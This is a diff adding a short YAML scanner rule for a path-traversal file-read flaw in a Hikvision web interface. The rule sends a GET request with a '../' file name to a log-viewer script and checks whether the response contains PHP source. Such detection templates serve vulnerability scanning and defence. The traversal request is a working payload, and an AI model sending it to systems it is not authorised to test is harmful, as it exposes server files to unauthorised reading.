@@ -1,0 +1,10 @@
+cve-id: hikvision-showfile-fileread
+rules:
+ - method: GET
+   path: /serverLog/showFile.php?fileName=../web/html/main.php
+   expression: |
+      response.status == 200 && response.body.bcontains(b'$_SERVER[\'HTTP_HOST\'];') && response.body.bcontains(b'$_POST[\'userName\'];')
+severity:
+  critical
+type: 
+  fileread
